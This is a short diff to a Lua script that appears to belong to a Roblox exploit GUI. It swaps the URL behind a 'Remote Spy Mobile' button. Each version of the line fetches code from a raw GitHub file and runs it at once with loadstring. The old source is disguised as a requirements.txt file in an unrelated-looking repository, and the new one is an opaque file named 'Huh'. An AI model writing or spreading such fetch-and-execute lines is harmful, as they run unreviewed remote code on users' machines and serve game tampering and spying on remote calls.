@@ -649,7 +649,7 @@ end)
 local remoteSpyBtn = createButton("Remote Spy Mobile", 5, CommonButtonsScroll, 40)
 
 remoteSpyBtn.MouseButton1Click:Connect(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/wfrefdewwss/Discord-Custom-Status-24-7/refs/heads/main/requirements.txt"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/catlyn316/Remote-captor/refs/heads/main/Huh"))()
 end)
 
 -- 改變所有玩家名按鈕
